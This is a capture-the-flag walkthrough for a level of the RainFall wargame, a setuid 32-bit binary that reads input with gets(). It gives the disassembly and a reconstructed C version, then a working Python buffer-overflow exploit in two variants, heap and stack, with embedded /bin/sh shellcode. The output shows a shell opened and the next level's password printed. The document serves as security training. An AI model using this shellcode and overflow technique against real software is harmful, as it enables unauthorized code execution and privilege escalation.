# Walkthrough
## Program type:
* Running the command `file ./level2` we see the file is 32-bit ELF
executable.
```
level2@RainFall:~$ file ./level2
./level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
```
* Running the command `checksec --file ./level2, we see that the stack is
executable (NX disabled).
```
level2@RainFall:~$ checksec --file ./level2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level2
```
## Content:
```
080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    eax,0x8048620
 804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc]
 804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048513:	89 04 24             	mov    DWORD PTR [esp],eax
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
 804852a:	89 04 24             	mov    DWORD PTR [esp],eax
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048535:	89 04 24             	mov    DWORD PTR [esp],eax
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave
 804853e:	c3                   	ret

0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave
 804854b:	c3                   	ret
```
* There's two function [`main`, `p`], `main` calls `p` and return.

* `p` use `fflush(3)` to clear the stdout and then fills a buffer with size 
56 bytes (Again, `gets(3)` is vulnerable because it doesn't have a stopping 
condition other than '\0').

* An if condition is used to check if the return address of the `main` 
function starts with `0xb`, this could be considered as a way to check if the
`saved-eip` of the `p` function was overwritten using `gets(3)` with something 
else other than the address that was meant to be there (the return address 
pushed on the stack from the function `main`, something like [this](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html)).

* If the `saved-eip` is changed, it `printf(1)` the changed address and calls 
`exit(3)`. Otherwise, it `puts(3)` the content of the buffer and duplicate it 
with `strdup(3)` (for no particulare reason), which means the heap now 
contains the content of the buffer.
## Reversing:
Upon analyzing the disassembly code we concluded that the actual C code could be something as follows:

```C
#include <stdio.h>

void	p(void)
{
	int		some_useless_variable;
	void	*return_addr; // Big chance the type of this variable is uint64_t and the previous variable does not exist
	char	buffer[56];
	
	fflush(stdin);
	gets(buffer);

	// 0 makes the function return the return_address of the current function.
	return_addr = __builtin_return_address(0);
	if (return_addr & 0xb0000000 != 0xb0000000)
	{
		printf("(%p)\n", return_addr);
		exit(1);
	}
	puts(buffer);
	strdup(buffer);
}

int	main()
{
	p();
	return (0);
}

```
## Solution:
* There's two ways to exploit this binary, both of'em are buffer overflows:
	* `strdup(3)` duplicates the buffer on the heap, the buffer contains a 
	shellcode that spawns a shell when it's executed and a address of the 
	duplicate in the heap that overwrite the saved-eip. Since the address of 
	the heap don't start with `0xb` we pass the mask validation and when the ret 
	instruction executes our shellcode.

	* Meanwhile, a normal stack buffer overflow won't work directly because of 
	the mask validation, so we'll push two addresses on the stack and calling 
	the return instruction twice, so when the mask validation occures, it will 
	find a correct address (not starting with `0xb`) and the second address will 
	jump to a memory area in the stack where our shellcode lies.

* Now lets write the python script that will enable us to access the shell using that vulnerability:
```python
import sys
import struct

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

def heapExp():
    tail = "\x00" * (80 - len(shellcode))
    new_eip = struct.pack('I', 0x0804a008)
    print shellcode + tail + new_eip

def stackExp():
    head = "\x90" * 80
    tail = "\x90" * 100
    gadget_addr = struct.pack('I', 0x0804853e)
    slide_addr = struct.pack('I', 0xbffff751)
    print head + gadget_addr + slide_addr + tail + shellcode

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "stack":
            stackExp()
        if sys.argv[1] == "heap":
            heapExp()
```
* Running the exploit give us access to an unauthorized shell:
```
level2@RainFall:~$ (python exp.py heap; cat -) | ./level2
�^�1��F�F
         �
          ���V
               ̀1ۉ�@̀�����/bin/sh
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
^C
level2@RainFall:~$ (python exp.py stack; cat -) | ./level2
����������������������������������������������������������������>������������>Q��������������������������������������������������������������������������������������������������������^�1��F�F
                                                                        �
                                                                         ���V
                                                                              ̀1ۉ�@̀�����/bin/sh
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```